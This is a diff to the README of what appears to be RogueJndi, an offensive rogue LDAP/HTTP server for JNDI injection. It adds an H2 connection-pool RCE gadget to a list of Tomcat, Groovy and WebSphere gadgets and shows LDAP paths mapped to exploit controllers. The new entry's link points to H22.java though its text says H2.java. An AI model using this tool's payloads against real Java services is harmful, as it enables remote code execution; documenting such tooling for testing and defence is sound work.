@@ -19,6 +19,7 @@ In addition to the known JNDI attack methods(via remote classloading in referenc
 * [Groovy.java](/src/main/java/artsploit/controllers/Groovy.java) - leads to RCE via unsafe reflection in **org.apache.naming.factory.BeanFactory** + **groovy.lang.GroovyShell**
 * [WebSphere1.java](/src/main/java/artsploit/controllers/WebSphere1.java) - leads to OOB XXE in **com.ibm.ws.webservices.engine.client.ServiceFactory**
 * [WebSphere2.java](/src/main/java/artsploit/controllers/WebSphere2.java) - leads to RCE via classpath manipulation in **com.ibm.ws.client.applicationclient.ClientJ2CCFFactory**
+* [H2.java](/src/main/java/artsploit/controllers/H22.java) - leads to RCE when loaded as a connection object from a JNDI based connection pool object (by invoking "getConnection()"**
 
 ### Usage
 ```
@@ -54,14 +55,15 @@ $ java -jar target/RogueJndi-1.1.jar --command "nslookup your_dns_sever.com" --h
 +-+-+-+-+-+-+-+-+-+
 Starting HTTP server on 0.0.0.0:8000
 Starting LDAP server on 0.0.0.0:1389
-Mapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference
-Mapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference
-Mapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat
-Mapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy
-Mapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1
-Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
-Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2
-Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
+Mapping ldap://127.0.1.1:1389/o=websphere2 to artsploit.controllers.WebSphere2
+Mapping ldap://127.0.1.1:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
+Mapping ldap://127.0.1.1:1389/o=groovy to artsploit.controllers.Groovy
+Mapping ldap://127.0.1.1:1389/ to artsploit.controllers.RemoteReference
+Mapping ldap://127.0.1.1:1389/o=reference to artsploit.controllers.RemoteReference
+Mapping ldap://127.0.1.1:1389/o=h2 to artsploit.controllers.H2
+Mapping ldap://127.0.1.1:1389/o=websphere1 to artsploit.controllers.WebSphere1
+Mapping ldap://127.0.1.1:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
+Mapping ldap://127.0.1.1:1389/o=tomcat to artsploit.controllers.Tomcat
 ```
 
 ### Building
